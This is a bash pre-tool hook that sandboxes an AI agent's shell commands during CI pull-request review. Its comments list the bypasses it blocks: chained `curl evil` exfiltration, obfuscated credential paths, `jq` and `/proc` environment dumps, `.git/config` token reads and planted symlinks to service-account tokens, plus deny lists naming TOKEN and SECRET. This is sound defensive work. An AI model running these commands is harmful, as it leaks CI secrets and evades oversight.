#!/usr/bin/env bash
# PreToolUse hook on the Bash tool: refuse a command that could write a file or
# run a program the permission allowlist never named.
#
# Three layers, and this is the middle one:
#
#   1. settings.json's permissions.allow bounds WHICH commands run at all.
#   2. This hook bounds what an allowed command can DO with the filesystem, with
#      the environment, and with a second command —
#      `permissions.allow` matches a command PREFIX, so `Bash(sort:*)` admits
#      `sort file -o out` and `Bash(cat:*)` admits `cat pr.json; curl evil`; a
#      prefix pattern cannot see a flag, a redirect, or an operator that comes
#      later.
#   3. Every post-model step runs from $RUNNER_TEMP/claude-trusted rather than
#      the working tree, so even a write that gets through changes nothing the
#      workflow later executes (see load-trusted-files.sh).
#
# Why a hook rather than more deny patterns: `Bash(sort -o:*)` only matches when
# the flag is the FIRST argument, which is the one place a model would not put
# it. The hook sees the whole command string.
#
# Hooks are safe to switch on here even though a PR can carry its own
# .claude/settings.json: load-trusted-files.sh restores that file from
# origin/main before the model runs, and main's copy declares only
# `permissions.deny` — no hooks at all (verified 2026-09-02 against
# `git show origin/main:.claude/settings.json`). So the only hook that runs in
# CI is this one.
#
# WHY THE RULES READ A NORMALIZED FORM, NOT THE RAW STRING
#
# A substring arm such as `*'/home/'*` matches the characters the model typed,
# and bash does not run the characters the model typed: it runs the WORD LIST
# left after quote removal and backslash-escape processing. `cat
# /hom\e/runner/.claud\e/.credential\s.json` and `cat /ho""me/runner/.creden""tials`
# both open the same files that `/home/` and `.credentials` are meant to fence
# off, and neither one contains either literal. So `normalize` below walks the
# command once and produces the word list bash would see; every substring and
# regex rule then reads those words joined by single spaces.
#
# Four kinds of rule must still read the RAW string, because normalization would
# destroy exactly what they look for: a bare newline, a control operator, `$(`
# and a backtick (each of which is a second command, not a word), and the
# unquoted-metacharacter scan (whose whole subject is whether a character was
# quoted).
#
# Contract (verified 2026-09-02 against the CLI binary, 2.1.258):
#   stdin  JSON with `tool_name` and, for Bash, `tool_input.command`. The CLI's
#          own documented example for a Bash PreToolUse hook reads exactly
#          `jq -r '.tool_input.command'`.
#   exit 0 allow, exit 2 "show stderr to model and block tool call".
#
# Fail-open on a payload this cannot parse: the CLI writes that payload, not the
# PR, and an unreadable one is a harness problem. Wedging every Bash call over
# it would take the review down while the allowlist is still in force.
set -uo pipefail

PAYLOAD=$(cat)

TOOL=$(printf '%s' "$PAYLOAD" | jq -r '.tool_name // empty' 2>/dev/null || echo "")
[ "$TOOL" = "Bash" ] || exit 0

CMD=$(printf '%s' "$PAYLOAD" | jq -r '.tool_input.command // empty' 2>/dev/null || echo "")
[ -n "$CMD" ] || exit 0

# A backslash immediately before a newline is a line continuation: the shell
# joins the two lines into ONE command, so it is whitespace here too. Every rule
# below reads the joined form; a BARE newline still starts a second command and
# is still refused.
CMD=${CMD//\\$'\n'/ }

deny() {
  printf 'Blocked by the reviewer sandbox: %s. Read the file instead; this review never needs to write one.\n' "$1" >&2
  exit 2
}

# ---------------------------------------------------------------------------
# Raw-string rules. Everything here is about a character bash has NOT yet turned
# into part of a word, so the raw command is the only correct subject.
# ---------------------------------------------------------------------------

# Redirects and here-docs write files; process substitution and command
# substitution run a second command the permission check may never see as its
# own segment.
case "$CMD" in
  *'>'*) deny "'>' redirects output to a file" ;;
  *'<'*) deny "'<' reads or here-docs into a command" ;;
  *'$('*) deny "'\$(' is command substitution" ;;
  *'`'*) deny "a backtick is command substitution" ;;
esac

# Control operators, checked before anything splits the string. Each one starts
# a SECOND command that the permission allowlist never sees as its own prefix:
# `cat pr.json; curl evil` is admitted by `Bash(cat:*)` in full. `|` is the one
# exception and is handled below, because a pipeline of read-only commands is
# how the review reads a long file.
NL='
'
case "$CMD" in
  *';'*) deny "';' starts a second command" ;;
  *'&&'*) deny "'&&' starts a second command" ;;
  *'||'*) deny "'||' starts a second command" ;;
  *'|&'*) deny "'|&' pipes stderr into a second command" ;;
  *'&'*) deny "'&' backgrounds a command" ;;
  *"$NL"*) deny "a newline starts a second command" ;;
esac

# ---------------------------------------------------------------------------
# Normalization: the word list bash would see.
# ---------------------------------------------------------------------------

allowed_var() {
  # The only variables the review's own prompts expand: $REVIEW_IN and
  # $REVIEW_OUT, the two directories the workflow hands the model. Everything
  # else the review used to interpolate — the PR number, the head sha, the
  # commit message, the trigger comment — now arrives as a FILE under
  # $REVIEW_IN, so no command needs to name it. Two of those were
  # attacker-controlled strings besides.
  #
  # Every other $NAME and ${...} is refused: $HOME, $OLDPWD or ${PATH##*:} all
  # name a path outside the checkout that no literal arm below can match.
  case "$1" in
    REVIEW_IN | REVIEW_OUT) return 0 ;;
  esac
  return 1
}

# The first metacharacter found, reported after the walk so the substring rules
# above it keep their precedence.
META_DENY=''
note_meta() { [ -n "$META_DENY" ] || META_DENY=$1; }

# Filled by `normalize`.
WORDS=()      # every word, in order, after quote removal and escape processing
WORD_SEG=()   # the pipeline segment each word belongs to
WORD_GLOB=()  # per word: the message for its first UNQUOTED glob character, or ''
SEGMENTS=()   # each segment's words, joined by single spaces

N_WORD=''     # the word being built
N_STARTED=0   # a word has begun (so `cat ''` is an empty word, not no word)
N_GLOB=''     # deny message for the first unquoted glob character in this word
N_SEG=''      # the current segment's words so far
N_SEGFIRST=1
N_SEGI=0

n_add() {
  N_WORD=$N_WORD$1
  N_STARTED=1
}

n_end_word() {
  [ "$N_STARTED" = 1 ] || return 0
  # An unquoted glob is only safe where it cannot escape the checkout. A
  # RELATIVE word with no '..' segment expands under the working directory and
  # nowhere else, which is how a model spells a search: `ls src/components/*`,
  # `rg -n foo src -g *.ts`. An absolute word, a '~' word or one climbing with
  # '..' could assemble any path out of characters the literal arms cannot see
  # (`cat /home*/runner/.cla*ude/.credential*`), so it fails closed.
  if [ -n "$N_GLOB" ]; then
    case $N_WORD in
      /* | '~'* | '..' | '../'* | *'/../'* | *'/..') note_meta "$N_GLOB" ;;
    esac
  fi
  WORDS+=("$N_WORD")
  WORD_SEG+=("$N_SEGI")
  WORD_GLOB+=("$N_GLOB")
  if [ "$N_SEGFIRST" = 1 ]; then
    N_SEG=$N_WORD
    N_SEGFIRST=0
  else
    N_SEG="$N_SEG $N_WORD"
  fi
  N_WORD=''
  N_STARTED=0
  N_GLOB=''
}

n_end_segment() {
  n_end_word
  SEGMENTS+=("$N_SEG")
  N_SEG=''
  N_SEGFIRST=1
  N_SEGI=$((N_SEGI + 1))
}

# One walker does three jobs, and it models the three states bash has: outside
# single quotes a backslash escapes the next character, inside single quotes
# nothing escapes, and each quote character is literal inside the other. A
# walker that only toggled on a quote character desyncs from bash on
# `grep "a\"b" f | nl`, which then reaches bash with a second command in it.
#
# Job one is the word list itself: quote characters are dropped, `\x` outside
# single quotes becomes `x`, and `""` / `''` vanish without breaking the word,
# so `/ho""me` and `/hom\e` both normalize to `/home`.
#
# Job two is splitting a pipeline. Only an UNQUOTED '|' separates two commands.
# `grep -v "node_modules\|\.git"` is one command whose argument happens to
# contain a pipe, and splitting on it would refuse the review's own cross-file
# search on a segment starting `\.git"`.
#
# Job three is noting an UNQUOTED expansion metacharacter, because every path
# arm below matches LITERAL text while an expansion assembles a path out of
# characters the arm cannot see. Quoted metacharacters stay allowed
# (`--include="*.ts"`, `grep "foo[0-9]"`), and so does a backslash-escaped one
# outside quotes (`\*`), which bash already passes through as a literal.
#
# A backslash inside double quotes is dropped here even where bash would keep it
# (bash keeps `\n` in `"a\nb"`). That direction is fail-closed: it can only
# reveal a path such as `"/ho\me/"`, never hide one.
normalize() {
  local s=$1 i=0 ch rest name quote='' tab
  tab=$(printf '\t')
  WORDS=()
  WORD_SEG=()
  WORD_GLOB=()
  SEGMENTS=()
  N_WORD=''
  N_STARTED=0
  N_GLOB=''
  N_SEG=''
  N_SEGFIRST=1
  N_SEGI=0
  while [ "$i" -lt "${#s}" ]; do
    ch=${s:i:1}
    # Inside single quotes every other character is literal, backslash included.
    if [ "$quote" = "'" ]; then
      if [ "$ch" = "'" ]; then quote=''; N_STARTED=1; else n_add "$ch"; fi
      i=$((i + 1))
      continue
    fi
    # Outside single quotes a backslash escapes the next character, whatever it
    # is: a quote, a pipe or a metacharacter. Consume both, keep the second.
    if [ "$ch" = '\' ]; then
      n_add "${s:i+1:1}"
      i=$((i + 2))
      continue
    fi
    # A parameter expansion is read in the unquoted AND the double-quoted state,
    # because `cat "$HOME/x"` leaves the checkout exactly as `cat $HOME/x` does.
    # '$(' is command substitution and is already refused above. The word keeps
    # `$NAME` so the literal arms can still see `$HOME`.
    if [ "$ch" = '$' ]; then
      rest=${s:i+1}
      case $rest in
        '{'*)
          name=${rest#\{}
          case $name in
            *'}'*) name=${name%%\}*} ;;
            *) name='' ;;
          esac
          allowed_var "$name" || note_meta "\${$name} expands a variable"
          i=$((i + 3 + ${#name}))
          ;;
        [A-Za-z_]*)
          name=${rest%%[!A-Za-z0-9_]*}
          allowed_var "$name" || note_meta "\$$name expands a variable"
          i=$((i + 1 + ${#name}))
          ;;
        *)
          name=''
          note_meta "'\$' expands a value"
          i=$((i + 1))
          ;;
      esac
      n_add "\$$name"
      continue
    fi
    # Inside double quotes a metacharacter is literal and "'" is an ordinary
    # character; only the closing '"' does anything.
    if [ -n "$quote" ]; then
      if [ "$ch" = '"' ]; then quote=''; N_STARTED=1; else n_add "$ch"; fi
      i=$((i + 1))
      continue
    fi
    case $ch in
      "'" | '"') quote=$ch; N_STARTED=1 ;;
      '|')
        n_end_segment
        i=$((i + 1))
        continue ;;
      ' ' | "$tab")
        n_end_word
        i=$((i + 1))
        continue ;;
      '*' | '?' | '[')
        [ -n "$N_GLOB" ] || N_GLOB="'$ch' is a glob that names a file this command does not spell"
        n_add "$ch" ;;
      '{' | '}')
        note_meta "'$ch' is a brace expansion"
        n_add "$ch" ;;
      # bash expands a tilde only at the START of a word (and after a ':' or an
      # '=' inside one), so `git diff HEAD~1` is a revision, not a home
      # directory, and the review runs it.
      '~')
        if [ "$N_STARTED" = 0 ]; then
          note_meta "'~' expands to a home directory"
        else
          case $N_WORD in
            *= | *:) note_meta "'~' expands to a home directory" ;;
          esac
        fi
        n_add "$ch" ;;
      *) n_add "$ch" ;;
    esac
    i=$((i + 1))
  done
  n_end_segment
}

normalize "$CMD"

# The normalized command: every word bash would see, joined by single spaces,
# with the pipeline separators kept so a rule cannot match across two commands
# any more freely than it did on the raw string.
NORM=${SEGMENTS[0]}
for ((i = 1; i < ${#SEGMENTS[@]}; i++)); do
  NORM="$NORM | ${SEGMENTS[i]}"
done

matches() { printf '%s' "$NORM" | grep -Eq "$1"; }

# The first and second word of each segment: the command word, and the git
# subcommand where there is one.
SEG_W0=()
SEG_W1=()
SEG_N=()
for ((i = 0; i < ${#SEGMENTS[@]}; i++)); do
  SEG_W0+=('')
  SEG_W1+=('')
  SEG_N+=(0)
done
for ((i = 0; i < ${#WORDS[@]}; i++)); do
  s=${WORD_SEG[i]}
  case ${SEG_N[s]} in
    0) SEG_W0[s]=${WORDS[i]} ;;
    1) SEG_W1[s]=${WORDS[i]} ;;
  esac
  SEG_N[s]=$((SEG_N[s] + 1))
done

# A literal '--' ends option parsing for the REST of its pipeline segment: every
# later word is an OPERAND, however it starts. `cat -- -leak.md` opens
# './-leak.md', so a resolution loop that reads a leading '-' as a flag that
# names no file refuses `cat ./-leak.md` and passes the same file through here.
# Recorded per word, because the '--' applies only inside its own segment.
WORD_OPERAND=()
DD_SEEN=()
for ((i = 0; i < ${#SEGMENTS[@]}; i++)); do
  DD_SEEN+=(0)
done
for ((i = 0; i < ${#WORDS[@]}; i++)); do
  s=${WORD_SEG[i]}
  WORD_OPERAND+=("${DD_SEEN[s]}")
  if [ "${WORDS[i]}" = '--' ]; then DD_SEEN[s]=1; fi
done

# ---------------------------------------------------------------------------
# Rules on the normalized form.
# ---------------------------------------------------------------------------

# Reading a credential is the same loss as writing a file, and the review runs
# beside GH_TOKEN, GITHUB_TOKEN and CLAUDE_CODE_OAUTH_TOKEN: the action exports
# all three into the CLI's environment whatever the step declares. `.git/` is
# here because git's own read commands never spell the directory — `cat
# .git/config` is the leak path, since actions/checkout persists the job token
# there as an http.<url>.extraheader.
case "$NORM" in
  *TOKEN*) deny "the command names TOKEN" ;;
  *SECRET*) deny "the command names SECRET" ;;
  *_KEY*) deny "the command names _KEY" ;;
  *PASSWORD*) deny "the command names PASSWORD" ;;
  *printenv*) deny "printenv reads the environment" ;;
  */proc/*) deny "/proc/ exposes the process environment" ;;
  *'declare -p'*) deny "declare -p dumps variables" ;;
  *'export -p'*) deny "export -p dumps the environment" ;;
  *'set -o'*) deny "set -o dumps shell state" ;;
  *'.git/'*) deny "'.git/' is where the checkout persists the job token" ;;
esac

# Nothing this review reads lives outside the checkout, and the paths that hold
# a credential all do: the CLI's own token file, gh's stored token, any
# home-directory dotfile. The Read tool has its own deny rules for these
# (settings.json permissions.deny); this is the same fence for Bash.
#
# These arms name the HOME DIRECTORY, not a directory name that also exists in
# the checkout: `.claude/` and `.config/` are ordinary tracked directories here
# and PRs change them, so an arm on either refuses the review's own reading of
# the files under review. What still closes the hole is the absolute-path rule
# below plus the metacharacter rule: with every absolute word but `/dev/null`
# refused, no command can reach a home directory at all.
case "$NORM" in
  *'~/'*) deny "'~/' reaches outside the checkout" ;;
  *'$HOME'*) deny "\$HOME reaches outside the checkout" ;;
  *'${HOME'*) deny "\${HOME reaches outside the checkout" ;;
  *'/home/'*) deny "'/home/' reaches outside the checkout" ;;
  *'/root/'*) deny "'/root/' reaches outside the checkout" ;;
  *'.credentials'*) deny "'.credentials' is a credential file" ;;
esac

# `environ` is a whole word, not a substring: `/proc/self/environ` is the leak
# path, `grep -rn environment src` is a search the review makes. A '/' or a '.'
# is a boundary here, so a path still matches.
if matches '(^|[^[:alnum:]_-])environ([^[:alnum:]_-]|$)'; then
  deny "'environ' reads the process environment"
fi

# jq is allowlisted and reaches the same data as printenv: `jq -n env` dumps
# every variable and `jq -rn '$ENV.GH_TOKEN'` reads one. Both halves are
# required, and `env` is a whole word bounded the way a command word is, so
# `grep -rn environment src`, `rg envelope .` and a path argument such as
# `src/env.ts` are untouched.
if matches '(^|[^[:alnum:]_/.-])jq([^[:alnum:]_/.-]|$)' &&
  { matches '(^|[^[:alnum:]_/.-])env([^[:alnum:]_/.-]|$)' || matches '\$ENV'; }; then
  deny "jq reads the environment through env / \$ENV"
fi

# Flags that write a file or run a program, checked WORD BY WORD rather than by
# a regex over the string. A regex has to guess at the separator after the flag
# and so misses the attached spellings a short option accepts — `sort file
# -oout.sh`, `git grep p -O/bin/sh`, `rg p --pre/bin/sh` — and a clustered short
# option (`sort -uo out`) misses it again. A word test sees all of them: no
# argument of these commands legitimately starts with the flag. The prefixes are
# deliberately blunt — `--pre*` also refuses rg's `--pretty`, which a piped CI
# review has no use for, and refusing one flag too many is the safe direction.
for ((i = 0; i < ${#WORDS[@]}; i++)); do
  w=${WORDS[i]}
  s=${WORD_SEG[i]}
  case $w in
    --compress-program*) deny "--compress-program runs a program of its own" ;;
  esac
  case ${SEG_W0[s]} in
    sort)
      case $w in
        -o* | -[A-Za-z]*o* | --output*) deny "sort -o / --output writes a file" ;;
      esac ;;
    rg)
      case $w in
        --pre* | --search-zip* | -z* | -[A-Za-z]*z*) deny "rg --pre / --search-zip / -z runs a program per file" ;;
      esac ;;
    git)
      case $w in
        --output*) deny "git --output writes a file" ;;
      esac
      if [ "${SEG_W1[s]}" = "grep" ]; then
        case $w in
          -O* | -[A-Za-z]*O* | --open-files-in-pager*) deny "git grep -O / --open-files-in-pager runs a program of its own" ;;
        esac
      fi ;;
  esac
done

[ -z "$META_DENY" ] || deny "$META_DENY"

# The review reads the checkout and the two directories the workflow hands it,
# and it spells those two in either of two forms: as $REVIEW_IN / $REVIEW_OUT,
# which allowed_var admits, or as the literal absolute path the workflow
# substituted into the prompts — the Read tool cannot expand a variable, so the
# prompts carry the value and the model types it in Bash too. So a legitimate
# word starts with '/' only for `/dev/null` or under one of those two
# directories, and none climbs out with '..'. Denying the rest is what makes a
# relative glob safe above: it can only expand inside the checkout.
#
# The literal exemption is a PREFIX on the word, so it buys nothing on its own:
# the '..' rule below still applies to the word, and the resolution rule after
# it still follows the word to its target.
review_dir_word() {
  local d
  for d in "${REVIEW_IN:-}" "${REVIEW_OUT:-}"; do
    [ -n "$d" ] || continue
    case "$1" in
      "$d" | "$d"/*) return 0 ;;
    esac
  done
  return 1
}

for ((i = 0; i < ${#WORDS[@]}; i++)); do
  w=${WORDS[i]}
  case $w in
    /dev/null) continue ;;
    /*) review_dir_word "$w" ||
      deny "'$w' is an absolute path; this review reads only the checkout and \$REVIEW_IN" ;;
  esac
  case $w in
    '..' | '../'* | *'/../'* | *'/..')
      deny "'$w' climbs out of the checkout with '..'" ;;
  esac
done

# ---------------------------------------------------------------------------
# The word is not the file.
# ---------------------------------------------------------------------------
#
# Every rule above reads the word the model typed, and `link` is four ordinary
# characters with nothing outside the checkout in them. The PR under review
# writes the tree those words resolve in, so it can commit
# `link -> /var/run/secrets/kubernetes.io/serviceaccount/token` and `cat link`
# reads the credential through a path this hook never sees. The rules read the
# word; the kernel reads the target.
#
# So a word that names something on disk relative to the hook's working
# directory (the checkout — the hook runs with the CLI's cwd) is resolved
# through its symlinks, and the target has to land inside the checkout root, or
# inside $REVIEW_IN / $REVIEW_OUT when the workflow set them.
#
# A word that names nothing on disk is skipped: the string rules above already
# judged it, and it cannot be read either way. So is a word carrying an
# expansion this hook cannot perform — a '$', a '~', a brace — or a leading
# '-' with no '--' before it in its segment, which keeps this to one stat per
# plain path argument and one per post-'--' operand. A word carrying an
# unquoted glob IS expanded here and every pathname it names is resolved, since
# bash expands it before the command runs. Absolute words never reach here — the
# loop above refuses every one but /dev/null, which is not a path in the
# checkout to begin with.
#
# This is the second layer: load-trusted-files.sh deletes an out-of-tree symlink
# before the model runs, and this refuses one that survives.

# The runner has GNU coreutils, so `readlink -f` is the path taken in CI. The
# two fallbacks are for a developer running the test suite on macOS, where
# `readlink` may predate -f and `realpath` may not be installed at all.
resolve_walk() {
  local p=$1 dir base target hops=0
  while [ "$hops" -lt 40 ]; do
    if [ -d "$p" ] && [ ! -L "$p" ]; then
      (cd -P -- "$p" 2> /dev/null && pwd -P) || return 1
      return 0
    fi
    dir=$(dirname -- "$p")
    base=$(basename -- "$p")
    dir=$(cd -P -- "$dir" 2> /dev/null && pwd -P) || return 1
    p="$dir/$base"
    [ -L "$p" ] || break
    target=$(readlink -- "$p") || return 1
    case $target in
      /*) p=$target ;;
      *) p="$dir/$target" ;;
    esac
    hops=$((hops + 1))
  done
  printf '%s' "$p"
}

resolve_path() {
  local out
  if out=$(readlink -f -- "$1" 2> /dev/null) && [ -n "$out" ]; then
    printf '%s' "$out"
    return 0
  fi
  if out=$(realpath -- "$1" 2> /dev/null) && [ -n "$out" ]; then
    printf '%s' "$out"
    return 0
  fi
  resolve_walk "$1"
}

# One newline-joined list, built once and only if some word needs it: the
# checkout root, then the two directories the workflow hands the model. Each is
# resolved the same way the target is, because a root reached through a symlink
# (macOS spells $TMPDIR under /var, which is a link to /private/var) would
# otherwise contain nothing.
ALLOWED_ROOTS=''
init_allowed_roots() {
  [ -z "$ALLOWED_ROOTS" ] || return 0
  local top d r
  top=$(git rev-parse --show-toplevel 2> /dev/null) || top=''
  [ -n "$top" ] || top=$PWD
  ALLOWED_ROOTS=$(resolve_path "$top") || ALLOWED_ROOTS=$top
  for d in "${REVIEW_IN:-}" "${REVIEW_OUT:-}"; do
    [ -n "$d" ] && [ -e "$d" ] || continue
    r=$(resolve_path "$d") || r=$d
    [ -n "$r" ] || continue
    ALLOWED_ROOTS="$ALLOWED_ROOTS
$r"
  done
}

inside_allowed() {
  local root
  while IFS= read -r root; do
    [ -n "$root" ] || continue
    case "$1" in
      "$root" | "$root"/*) return 0 ;;
    esac
  done <<< "$ALLOWED_ROOTS"
  return 1
}

# One resolution. `label` is what a refusal names: the word itself, or — for a
# glob — the pathname the pattern expanded to, since that is the file the
# command opens and the word does not contain it.
check_resolves_inside() {
  local w=$1 label=$2 target
  [ -e "$w" ] || [ -L "$w" ] || return 0
  target=$(resolve_path "$w") || return 0
  [ -n "$target" ] || return 0
  init_allowed_roots
  inside_allowed "$target" && return 0
  deny "refuses $label: resolves outside the checkout ($target)"
}

# bash expands a relative glob BEFORE the command runs, and not one of the names
# it produces is in the word: `cat web-ui/src/assets/notes.md` is refused for a
# link out of the tree, while `cat web-ui/src/assets/*.md` opens the same file
# through a word with no 'notes.md' in it. So expand the pattern the way bash
# would and resolve every match.
#
# The expansion is an array assignment under `nullglob` rather than
# `compgen -G`: compgen's output is newline-joined, so a committed filename
# carrying a newline would split into pieces that name nothing and skip the
# check. IFS is emptied so a name with a space stays one element, and the
# expansion is unquoted because a quoted one does not glob. A pattern that
# matches nothing yields no words, which is also what bash does with it: it
# passes the pattern through literally, and the string rules above judged it.
GLOB_MATCHES=()
glob_matches() {
  local had=0 IFS=''
  shopt -q nullglob && had=1
  shopt -s nullglob
  # shellcheck disable=SC2206  # unquoted on purpose: this line IS the expansion
  GLOB_MATCHES=($1)
  [ "$had" = 1 ] || shopt -u nullglob
}

# Every match costs a stat and a resolution, and a pattern that names this many
# files is not a command a review runs.
GLOB_MAX=500

for ((i = 0; i < ${#WORDS[@]}; i++)); do
  w=${WORDS[i]}
  case $w in
    '') continue ;;
    # A '-' word is a flag and names no file — unless a literal '--' came
    # earlier in its segment, which makes it an operand the command opens.
    -*) [ "${WORD_OPERAND[i]}" = 1 ] || continue ;;
    # Every absolute word but a $REVIEW_IN / $REVIEW_OUT one is already refused
    # above; those two are followed here like any other path.
    /*) review_dir_word "$w" || continue ;;
  esac
  # An expansion this hook cannot perform: a brace is refused outright above,
  # and a '~' or a '$' that got this far is a revision (`HEAD~1`) or one of the
  # two allowed variables, whose value the hook does not hold.
  case $w in
    *'{'* | *'}'* | *'~'* | *'$'*) continue ;;
  esac
  if [ -n "${WORD_GLOB[i]}" ]; then
    glob_matches "$w"
    if [ "${#GLOB_MATCHES[@]}" -gt "$GLOB_MAX" ]; then
      deny "'$w' expands to ${#GLOB_MATCHES[@]} paths, past the $GLOB_MAX this review resolves at once"
    fi
    if [ "${#GLOB_MATCHES[@]}" -gt 0 ]; then
      for m in "${GLOB_MATCHES[@]}"; do
        check_resolves_inside "$m" "$m"
      done
    fi
    continue
  fi
  # A glob character that was QUOTED is a literal argument to bash, not a
  # pattern: there is nothing to expand and the word names no file.
  case $w in
    *'*'* | *'?'* | *'['*) continue ;;
  esac
  check_resolves_inside "$w" "$w"
done

# Every segment of a pipeline, not just the first: `cat x | curl evil` is
# admitted by `Bash(cat:*)`, which matches the PREFIX and stops reading there.
# A leading redirect cannot appear in a segment, because '>' and '<' are already
# refused above, so the first word is the command word.
allowed_word() {
  case "$1" in
    git | grep | rg | cat | head | tail | wc | ls | jq | sort | cut | tr | diff | test | true | false)
      return 0 ;;
  esac
  return 1
}

# echo and printf are refused outright rather than listed: the model has a read
# tool, so it never needs to print a string, and both are the shortest path from
# a value the model holds to the run log.
for ((i = 0; i < ${#SEGMENTS[@]}; i++)); do
  word=${SEG_W0[i]}
  case "$word" in
    echo | printf) deny "$word prints a value; read the file instead" ;;
  esac
  if ! allowed_word "$word"; then
    deny "'${word:-<empty>}' is not one of the commands this review may run"
  fi
  if [ "$word" = "git" ]; then
    sub=${SEG_W1[i]}
    case "$sub" in
      diff | log | show | grep | blame | ls-files | status | rev-parse) : ;;
      *) deny "'git ${sub:-<none>}' is not one of the read-only git subcommands" ;;
    esac
  fi
done

exit 0
